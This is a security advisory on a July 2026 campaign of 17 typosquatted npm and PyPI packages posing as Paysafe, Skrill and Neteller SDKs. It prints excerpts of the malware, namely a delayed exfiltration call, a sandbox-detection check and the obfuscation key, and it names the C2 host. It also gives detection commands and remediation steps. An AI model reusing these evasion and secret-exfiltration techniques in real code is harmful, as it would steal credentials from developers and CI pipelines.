# Fake Payment SDK Campaign — 17 Typosquatted npm/PyPI Packages Steal CI Secrets via Paysafe, Skrill, and Neteller Impersonation

**Date:** July 2026
**Ecosystem:** npm / PyPI
**Severity:** High
**Type:** Typosquatting / Credential Stealer / CI/CD Secret Theft
**Sources:**
- [Socket — Coordinated npm and PyPI Campaign Typosquats Popular Secure Payment Apps](https://socket.dev/blog/npm-pypi-campaign-typosquats-popular-secure-payment-apps)
- [GBHackers — npm and PyPI Malware Campaign Exfiltrates CI/CD Secrets Through Fake Payment SDKs](https://gbhackers.com/npm-and-pypi-malware/)
- [BleepingComputer — Fake Paysafe, Skrill SDKs on npm and PyPI steal credentials](https://www.bleepingcomputer.com/news/security/fake-paysafe-skrill-sdks-on-npm-and-pypi-steal-credentials/)
- [GitGuardian — The Streak Continues: Four More Supply Chain Attacks Hit npm and PyPI](https://blog.gitguardian.com/shai-hulud-npm-pypi-supply-chain-attacks/)

---

## Summary

On July 7, 2026, Socket's AI scanner detected a coordinated cluster of 17 malicious packages published nearly simultaneously across npm (13 packages, each in four versions 1.0.0–1.0.3) and PyPI (4 packages, one version each). All packages impersonated official SDKs for three popular payment processors — Paysafe, Skrill, and Neteller — using names close enough to attract developers searching for or installing payment integration libraries.

The packages function as convincing facades: they export a `PaysafeClient` (or equivalent) class that accepts real API keys, returns `{ success: true }` responses to keep downstream code running, and silently schedules a credential exfiltration routine in the background with a ~12-second delay designed to outlast automated sandbox inspections. The malware collects all environment variables matching common secret-naming patterns (KEY, SECRET, TOKEN, PASS, AUTH, API) — precisely the vars present in CI/CD runners — and ships them to an ngrok-tunneled C2. All 13 npm packages were flagged as malware within six minutes of publication.

The campaign's use of distinct obfuscation keys per package (preventing cross-package hash signatures), multi-ecosystem scope, ngrok infrastructure shared with established stealer groups, and awareness of sandbox detection techniques suggests a technically capable actor that is likely to return.

---

## Compromised Artifacts

### npm (13 packages, 4 versions each: 1.0.0–1.0.3)

| Package | Impersonated Service |
|---------|---------------------|
| `paysafe-checkout` | Paysafe |
| `paysafe-vault` | Paysafe |
| `paysafe-js` | Paysafe |
| `paysafe-api` | Paysafe |
| `paysafe-node` | Paysafe |
| `paysafe-cards` | Paysafe |
| `paysafe-fraud` | Paysafe |
| `paysafe-kyc` | Paysafe |
| `paysafe-payments` | Paysafe |
| `neteller` | Neteller |
| `skrill` | Skrill |
| `skrill-sdk` | Skrill |
| `skrill-payments` | Skrill |

### PyPI (4 packages, 1 version each: 1.0.0)

| Package | Impersonated Service |
|---------|---------------------|
| `paysafe-kyc` | Paysafe |
| `paysafe-payments` | Paysafe |
| `paysafe-sdk` | Paysafe |
| `paysafe-api` | Paysafe |

---

## How It Worked

### Fake SDK Facade

Each npm package exports a `PaysafeClient` class that mimics a real payment REST client. It reads `PAYSAFE_API_KEY` and `PAYSAFE_ENV` from the environment and exposes `payments.create/get` and `customers.create/get` methods. All methods return `{ success: true, method, path }` immediately — no actual call is made to `api.paysafe.com` — while scheduling a background exfiltration call after an 11,768 ms (≈12 second) delay. The delay lets the package survive synchronous sandbox analysis that exits before async callbacks fire.

```javascript
async _request(method, path, data) {
  if (this.apiKey) {
    setTimeout(() => exfiltrate({ m: method, p: path, k: this.apiKey.substring(0, 10) }), 11768)
  }
  return { success: true, method, path }
}
```

PyPI packages activate universally on import via `__init__.py` (not gated on an API key), using functionally equivalent Python code.

### Anti-Analysis and Sandbox Evasion

The exfiltration routine returns early if the victim environment appears to be a sandbox:

```javascript
function isSandbox() {
  const cpus = os.cpus()
  if (!cpus || cpus.length < 2) return true   // < 2 CPU cores

  const hostname = os.hostname().toLowerCase()
  const username = os.userInfo().username.toLowerCase()
  const sandboxIndicators = ['sandbox', 'analyzer', 'cuckoo', 'virus', 'malware', 'vmware', 'vbox']
  for (const indicator of sandboxIndicators) {
    if (hostname.includes(indicator) || username.includes(indicator)) return true
  }
  return false
}
```

### C2 Hostname Obfuscation

The C2 domain is hidden behind three decode layers: Base64 decode → XOR with a key → subtract 17 from each char code → reverse string. The decoded domain is `caliber-spinner-finishing.ngrok-free.dev`. The IP resolved from this ngrok hostname had prior reputation as C2 for NjRAT, suggesting shared infrastructure with established cybercrime groups.

```javascript
const XOR_KEY = Buffer.from('SGf6lmbr7GHUg99Z6R2U3g==', 'base64')
// XOR decode → subtract 17 from each char → reverse
// → 'caliber-spinner-finishing.ngrok-free.dev'
```

### Credential Exfiltration

The malware collects:
- Victim fingerprint: hostname, username, current working directory, timestamp
- All environment variables whose name contains `KEY`, `SECRET`, `TOKEN`, `PASS`, `AUTH`, or `API` (values truncated to 100 characters)
- Additional context: HTTP method, API path, first 10 chars of the Paysafe API key

In CI/CD environments this captures `AWS_SECRET_ACCESS_KEY`, `GITHUB_TOKEN`, `NPM_TOKEN`, and any similarly named pipeline secrets. All data is sent via HTTPS POST to the ngrok endpoint.

---

## Timeline

| Date/Time (UTC) | Event |
|----------------|-------|
| 2026-07-07 ~18:09 | 17 malicious packages published nearly simultaneously to npm and PyPI |
| 2026-07-07 ~18:15 | Socket AI scanner flags all 13 npm packages as malware (~6 minutes after publication) |
| 2026-07-07 | npm and PyPI remove all identified malicious packages |
| 2026-07-07 | Socket publishes full technical disclosure including IOCs |

---

## Detection

```bash
# Check for any of the 13 malicious npm packages installed
npm ls paysafe-checkout paysafe-vault paysafe-js paysafe-api paysafe-node \
  paysafe-cards paysafe-fraud paysafe-kyc paysafe-payments \
  neteller skrill skrill-sdk skrill-payments 2>/dev/null

# Search package-lock.json or yarn.lock for any of these package names
grep -E '"(paysafe-checkout|paysafe-vault|paysafe-js|paysafe-api|paysafe-node|paysafe-cards|paysafe-fraud|paysafe-kyc|paysafe-payments|neteller|skrill|skrill-sdk|skrill-payments)"' \
  package-lock.json yarn.lock 2>/dev/null

# Check Python environment for malicious PyPI packages
pip show paysafe-kyc paysafe-payments paysafe-sdk paysafe-api 2>/dev/null

# Hunt for outbound HTTPS to ngrok infrastructure from CI hosts (unusual for payment SDKs)
ss -tnp | grep ':443'
netstat -tnp 2>/dev/null | grep -i 'ngrok'

# Search CI/CD logs for ngrok-free.dev connections from npm install or Python build steps
grep -rn 'caliber-spinner-finishing' /var/log/ ~/.npm/_logs/ 2>/dev/null

# Search for the obfuscated C2 string in installed package files
grep -r 'caliber-spinner-finishing' node_modules/ 2>/dev/null
grep -r 'SGf6lmbr7GHUg99Z6R2U3g==' node_modules/ 2>/dev/null

# Check SHA256 of suspicious index.js files in paysafe/skrill/neteller packages
# Example known-malicious hashes (npm index.js):
# ce09810adca70ebec87bc455380ef629ceaa2a0d926149d9115604060167682c
# b2ea8d69f6792a87327ffde2ee4551bb6b99617f53e1ba71bf9a70f45dbc57ea
# 8a70a5c1075f2dea4db94633ddc64b0d03d0385fdeda7c226acc944331febf43
sha256sum node_modules/paysafe-node/index.js 2>/dev/null
```

---

## Remediation

1. **Remove all 17 packages immediately** from `package.json`, `requirements.txt`, and any lock files. These packages impersonate payment SDKs that do not have official npm/PyPI equivalents — use the payment providers' official SDKs or REST APIs directly.
2. **Treat any host where a compromised package was installed or imported as fully compromised.** Assume all environment variables were exfiltrated — including `AWS_SECRET_ACCESS_KEY`, `GITHUB_TOKEN`, `NPM_TOKEN`, `DATABASE_PASSWORD`, and any other secret present at install/import time.
3. **Rotate all secrets immediately:** cloud IAM credentials, npm and PyPI publish tokens, GitHub tokens, API keys, and payment processor API keys (Paysafe, Skrill, Neteller).
4. **Review CI/CD logs** for outbound HTTPS connections to `*.ngrok-free.dev` from build jobs that used any of the listed packages.
5. **Audit dependency trees** across all repositories to confirm no transitive dependency pulled these packages in.
6. **Block `.ngrok-free.dev`** at the network perimeter for all build/CI infrastructure (legitimate payment SDKs do not use ngrok).

---

## Lessons Learned

- **Typosquatting payment SDK names** is high-yield: developers integrating payment gateways often search for SDKs by name and may install unofficial packages without verifying provenance or registry origin.
- **Returning valid API responses** (even without calling real endpoints) keeps applications functional and delays detection — the attack may go unnoticed until the next secret rotation cycle.
- **Per-package unique obfuscation keys** prevent cross-package hash-signature detection, making registry-level blocking based on malware signatures less effective.
- **The 12-second delay** for exfiltration evades synchronous sandbox runners that impose short timeouts on installed packages.
- **ngrok relay infrastructure** makes the C2 endpoint effectively ephemeral — IP-based blocklists are insufficient; block the ngrok subdomain pattern.
- **Multi-ecosystem campaigns (npm + PyPI)** require defenders to have visibility across both registries simultaneously, not just the one where the install occurs.
- **Socket's AI-based publish-time analysis** flagged all 13 npm packages within six minutes — faster than any human review cycle, demonstrating the value of registry-level behavioral scanning at publish time.

---

## Related Incidents

- [./2026-04-fake-tanstack-npm.md](./2026-04-fake-tanstack-npm.md) — Name-squatting on @tanstack org with env file exfiltration via legitimate webhook relay
- [./2026-01-gone-phishin-npm-phishing.md](./2026-01-gone-phishin-npm-phishing.md) — npm packages used as CDN for spear-phishing kits, no developer machine compromise needed
- [./2026-07-jscrambler-npm-preinstall-binary.md](./2026-07-jscrambler-npm-preinstall-binary.md) — Same week, stolen npm publish token deploys cross-platform stealer across Jscrambler plugins
- [./2026-07-asyncapi-miasma-v3-cicd.md](./2026-07-asyncapi-miasma-v3-cicd.md) — Same week, hijacked CI/CD pipeline publishes Miasma RAT to 4 AsyncAPI packages with 2.25M weekly DLs
